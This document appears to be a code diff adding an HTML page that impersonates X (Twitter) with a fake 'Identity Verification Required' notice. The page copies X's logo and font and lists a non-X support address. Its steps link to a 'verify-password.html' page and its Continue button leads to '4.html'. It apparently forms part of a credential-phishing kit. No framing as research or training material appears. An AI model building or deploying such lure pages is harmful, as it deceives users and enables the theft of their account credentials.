@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification Required</title>
+
+    <style>
+        @font-face {
+            font-family: 'Chirp';
+            src: url('Chirp Regular.woff') format('woff');
+            font-weight: 400;
+        }
+
+        @font-face {
+            font-family: 'Chirp';
+            src: url('Chirp Medium.woff') format('woff');
+            font-weight: 500;
+        }
+
+        @font-face {
+            font-family: 'Chirp';
+            src: url('Chirp Bold.woff') format('woff');
+            font-weight: 700;
+        }
+
+        @font-face {
+            font-family: 'Chirp';
+            src: url('Chirp Heavy.woff') format('woff');
+            font-weight: 800;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Chirp', Arial, Helvetica, sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* =========================
+           NAVBAR / HEADER
+        ========================= */
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .nav-left,
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .nav-link {
+            text-decoration: none;
+            color: #8a8a8a;
+            font-size: 14px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            transition: 0.3s;
+        }
+
+        .nav-link:hover { color: white; }
+
+        .lang-btn,
+        .signin-btn {
+            padding: 10px 20px;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: transparent;
+            color: white;
+            border-radius: 25px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        /* =========================
+           MAIN
+        ========================= */
+
+        main {
+            min-height: calc(100vh - 90px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .verification-container {
+            width: 100%;
+            max-width: 950px;
+            display: grid;
+            grid-template-columns: 360px 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        /* =========================
+           LEFT CARD
+        ========================= */
+
+        .info-card {
+            height: 480px;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+
+            background:
+                linear-gradient(
+                    to bottom,
+                    #f5f5f5 0%,
+                    #eeeeee 25%,
+                    #c2c2c2 45%,
+                    #707070 62%,
+                    #292929 82%,
+                    #111 100%
+                );
+
+            border: 1px solid #333;
+        }
+
+        .info-message {
+            position: absolute;
+            top: 50%;
+            left: 25px;
+            right: 25px;
+            transform: translateY(-50%);
+            padding: 24px;
+            border-radius: 10px;
+            background: rgba(65, 65, 65, .55);
+            backdrop-filter: blur(7px);
+        }
+
+        .info-icon {
+            color: #ddd;
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+
+        .info-message p {
+            color: #eee;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .card-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 18px;
+        }
+
+        .brand-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .brand-text {
+            font-size: 13px;
+            color: #eee;
+            line-height: 1.4;
+        }
+
+        .brand-text strong {
+            display: block;
+            font-size: 15px;
+        }
+
+        /* =========================
+           RIGHT CONTENT
+        ========================= */
+
+        .content {
+            width: 100%;
+        }
+
+        .content h1 {
+            font-size: 42px;
+            line-height: 1.1;
+            font-weight: 600;
+            letter-spacing: -.7px;
+            margin-bottom: 12px;
+        }
+
+        .description {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            max-width: 450px;
+        }
+
+        /* =========================
+           SUPPORT EMAIL
+        ========================= */
+
+        .email-label {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 8px;
+        }
+
+        .email-box {
+            height: 48px;
+            background: #17191d;
+            border: 1px solid #282a2e;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            color: #eee;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+
+        /* =========================
+           HOW TO VERIFY
+        ========================= */
+
+        .verify-box {
+            background: #17191d;
+            border: 1px solid #282a2e;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .verify-title {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .step-link {
+            color: #fff;
+            text-decoration: underline;
+            text-decoration-color: #777;
+            text-underline-offset: 2px;
+            cursor: pointer;
+        }
+
+        .step-link:hover {
+            color: #aaa;
+        }
+
+        .radio {
+            width: 12px;
+            height: 12px;
+            border: 1px solid #555;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        /* =========================
+           WARNING
+        ========================= */
+
+        .warning {
+            color: #666;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* =========================
+           BUTTONS
+        ========================= */
+
+        .buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        button.back,
+        button.continue {
+            height: 50px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .back {
+            background: transparent;
+            color: #fff;
+            border: 1px solid #292929;
+        }
+
+        .continue {
+            background: #fff;
+            color: #000;
+            border: none;
+        }
+
+        .back:hover {
+            border-color: #555;
+        }
+
+        .continue:hover {
+            background: #ddd;
+        }
+
+        /* =========================
+           RESPONSIVE
+        ========================= */
+
+        @media (max-width: 850px) {
+            .navbar { padding: 20px; }
+            .nav-left .nav-link { display: none; }
+
+            .verification-container {
+                width: 100%;
+                max-width: 500px;
+                grid-template-columns: 1fr;
+                gap: 40px;
+            }
+
+            .info-card {
+                height: 380px;
+            }
+
+            .content h1 {
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<nav class="navbar">
+    <div class="nav-left">
+        <div class="logo">𝕏</div>
+        <a href="#" class="nav-link">Help Center</a>
+        <a href="#" class="nav-link">Account</a>
+        <a href="#" class="nav-link">Safety</a>
+        <a href="#" class="nav-link">Contact</a>
+    </div>
+
+    <div class="nav-right">
+        <button class="lang-btn" type="button">🌐 English</button>
+        <button class="signin-btn" type="button">Sign In</button>
+    </div>
+</nav>
+
+<main>
+    <div class="verification-container">
+
+        <!-- LEFT INFORMATION CARD -->
+        <div class="info-card">
+            <div class="info-message">
+                <div class="info-icon">
+                    ♙
+                </div>
+                <p>
+                    This verification process is designed to
+                    protect your account and prevent fraudulent
+                    activity. Once completed, you should be able
+                    to safely access your account.
+                </p>
+                <div class="card-brand">
+                    <div class="brand-icon">
+                        𝕏
+                    </div>
+                    <div class="brand-text">
+                        <strong>Account Security</strong>
+                        Identity Verification
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RIGHT CONTENT -->
+        <section class="content">
+            <h1>
+                Identity Verification Required
+            </h1>
+
+            <p class="description">
+                To protect your account and ensure security,
+                we need to verify your identity before you
+                can access this service. This is a standard
+                security measure to keep your account safe.
+            </p>
+
+            <div class="email-label">
+                Secure verification support
+            </div>
+
+            <div class="email-box">
+                support-9A1838@support.info
+            </div>
+
+            <div class="verify-box">
+                <div class="verify-title">
+                    How to verify:
+                </div>
+                <div class="steps">
+                    <div class="step">
+                        <span class="radio"></span>
+                        Open X and <a class="step-link" href="verify-password.html" target="_blank" rel="noopener">sign</a> into your account
+                    </div>
+                    <div class="step">
+                        <span class="radio"></span>
+                        Visit the verification page
+                    </div>
+                    <div class="step">
+                        <span class="radio"></span>
+                        Follow the instructions shown
+                    </div>
+                    <div class="step">
+                        <span class="radio"></span>
+                        Complete the identity verification
+                    </div>
+                </div>
+            </div>
+
+            <p class="warning">
+                Your information will only be used for verification
+                purposes. Never share your password or security
+                codes with anyone.
+            </p>
+
+            <div class="buttons">
+                <button class="back" type="button" onclick="history.back()">
+                    Back
+                </button>
+                <button class="continue" type="button" onclick="window.location.href='4.html'">
+                    Continue
+                </button>
+            </div>
+        </section>
+
+    </div>
+</main>
+
+</body>
+</html>
